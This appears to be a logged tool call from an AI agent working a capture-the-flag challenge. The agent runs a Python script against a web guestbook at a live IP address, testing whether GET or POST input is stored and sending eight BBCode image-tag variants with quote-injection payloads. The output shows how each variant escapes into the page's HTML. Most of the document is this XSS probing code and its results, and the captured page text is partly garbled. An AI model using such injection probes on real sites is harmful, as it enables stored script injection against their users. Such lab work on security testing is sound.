@@ -1,0 +1,39 @@
+{
+  "arguments": {
+    "code": "\nimport time, urllib.request, urllib.parse, urllib.error\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef get(path=\"\", data=None):\n    d = urllib.parse.urlencode(data).encode() if data is not None else None\n    with op.open(BASE + path, data=d, timeout=20) as r:\n        return r.read().decode(\"gb18030\", \"replace\")\n\nprint(\"[1] GET 是否能写入\")\nbefore = get()\nget(\"?content=GETWRITEZZZ\")\ntime.sleep(0.3)\nafter = get()\nprint(\"    GETWRITEZZZ 出现:\", \"GETWRITEZZZ\" in after)\n\nprint(\"[2] index.php 上 POST 是否同样存储\")\nget(\"index.php\", {\"content\": \"POSTIDXZZZ\"})\ntime.sleep(0.3)\nprint(\"    POSTIDXZZZ 出现:\", \"POSTIDXZZZ\" in get())\n\nprint(\"[3] BBCode 变体矩阵 (看 src 里是否出现未转义的引号)\")\nvariants = [\n    (\"大写\",      \"[IMG]http://a.b/c.png\\\"Z1[/IMG]\"),\n    (\"混合\",      \"[Img]http://a.b/c.png\\\"Z2[/Img]\"),\n    (\"嵌套\",      \"[[img]http://a.b/c.png\\\"Z3[/img]]\"),\n    (\"双开\",      \"[img][img]http://a.b/c.png\\\"Z4[/img]\"),\n    (\"空url\",     \"[img]\\\"Z5[/img]\"),\n    (\"换行\",      \"[img]http://a.b/c.png\\n\\\"Z6[/img]\"),\n    (\"无闭合\",    \"[img]http://a.b/c.png\\\"Z7\"),\n    (\"重复闭\",    \"[img]http://a.b/c.png\\\"Z8[/img][/img]\"),\n]\nfor name, payload in variants:\n    tag = \"V%s\" % payload[payload.find(\"Z\")+1:payload.find(\"Z\")+2]\n    get(\"\", {\"content\": payload})\n    time.sleep(0.25)\n    body = get()\n    i = body.find(\"Z\" + tag[1:])\n    seg = body[max(0,i-160):i+80] if i >= 0 else \"(未找到)\"\n    print(\"  --%s--\" % name)\n    print(\"     输入:\", payload.replace(\"\\n\", \"\\\\n\"))\n    print(\"     输出:\", repr(seg))\n",
+    "timeout": 180,
+    "wp_purpose": "测试GET写入与BBCode变体的转义缺口",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "response": {
+    "ok": true,
+    "result": {
+      "exit": 0,
+      "stdout": "[1] GET 是否能写入\n    GETWRITEZZZ 出现: False\n[2] index.php 上 POST 是否同样存储\n    POSTIDXZZZ 出现: False\n[3] BBCode 变体矩阵 (看 src 里是否出现未转义的引号)\n  --大写--\n     输入: [IMG]http://a.b/c.png\"Z1[/IMG]\n     输出: 'Fucked at:2026-10-17 23:40:00 PM</p></pre>\\n<pre>P0STIDXZZZ<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:55 PM</p></pre>\\n<pre>[IMG]a.b&#47;c.png\\\\&#34;Z1[&#47;IMG]<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:55 PM</p></'\n  --混合--\n     输入: [Img]http://a.b/c.png\"Z2[/Img]\n     输出: ':55 PM</p></pre>\\n<pre>[IMG]a.b&#47;c.png\\\\&#34;Z1[&#47;IMG]<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:55 PM</p></pre>\\n<pre>[Img]a.b&#47;c.png\\\\&#34;Z2[&#47;Img]<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:55 PM</p></'\n  --嵌套--\n     输入: [[img]http://a.b/c.png\"Z3[/img]]\n     输出: 're>\\n<pre>[Img]a.b&#47;c.png\\\\&#34;Z2[&#47;Img]<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:55 PM</p></pre>\\n<pre>[<img src=\"http://a.b&#47;c.png\\\\&#34;Z3\" />]<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:56 PM</p></pre>\\n'\n  --双开--\n     输入: [img][img]http://a.b/c.png\"Z4[/img]\n     输出: '://a.b&#47;c.png\\\\&#34;Z3\" />]<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:56 PM</p></pre>\\n<pre><img src=\"http://<img src=\"http://a.b&#47;c.png\\\\&#34;Z4\" /><p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:56 PM</p></pre>\\n'\n  --空url--\n     输入: [img]\"Z5[/img]\n     输出: '<img src=\"http://<img src=\"http://a.b&#47;c.png\\\\&#34;Z4\" /><p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:56 PM</p></pre>\\n<pre><img src=\"http://\\\\&#34;Z5\" /><p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:57 PM</p></pre>\\n'\n  --换行--\n     输入: [img]http://a.b/c.png\\n\"Z6[/img]\n     输出: '</p></pre>\\n<pre><img src=\"http://\\\\&#34;Z5\" /><p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:57 PM</p></pre>\\n<pre><img src=\"http://a.b&#47;c.png\\n\\\\&#34;Z6\" /><p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:57 PM</p></pre>\\n'\n  --无闭合--\n     输入: [img]http://a.b/c.png\"Z7\n     输出: 're><img src=\"http://a.b&#47;c.png\\n\\\\&#34;Z6\" /><p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:57 PM</p></pre>\\n<pre><img src=\"http://a.b&#47;c.png\\\\&#34;Z7<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:58 PM</p></pre>\\n'\n  --重复闭--\n     输入: [img]http://a.b/c.png\"Z8[/img][/img]\n     输出: 'e>\\n<pre><img src=\"http://a.b&#47;c.png\\\\&#34;Z7<p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:58 PM</p></pre>\\n<pre><img src=\"http://a.b&#47;c.png\\\\&#34;Z8\" />\" /><p>IP涓�221.176.187.*鐨勭\\ue062闉� >>> Fucked at:2026-10-17 23:40:58 PM</p></pr'\n",
+      "stderr": "",
+      "output_truncated": false
+    },
+    "tool": "py_run",
+    "dangerous": false,
+    "wp_operation": {
+      "operation_id": "b57f009cec874ce3ab2a47a190febdb9",
+      "step": 30
+    },
+    "duration_ms": 4748.5,
+    "task_health": {
+      "ok": true,
+      "case": "ctf-fca56ff3a53c802b",
+      "calls": 15,
+      "failed_calls": 3,
+      "active_tool_seconds": 51.19,
+      "recent_failure_streak": 0,
+      "warnings": [],
+      "policy": "advisory_only",
+      "execution_blocked": false,
+      "model_tokens": null,
+      "model_cost": null,
+      "scope": "仅统计经过本系统的新调用；不含模型推理时间或费用，不证明答案正确。"
+    },
+    "evidence_path": "[CTF_ROOT]\\logs\\calls\\1792251658567739600-387c5743.json"
+  }
+}
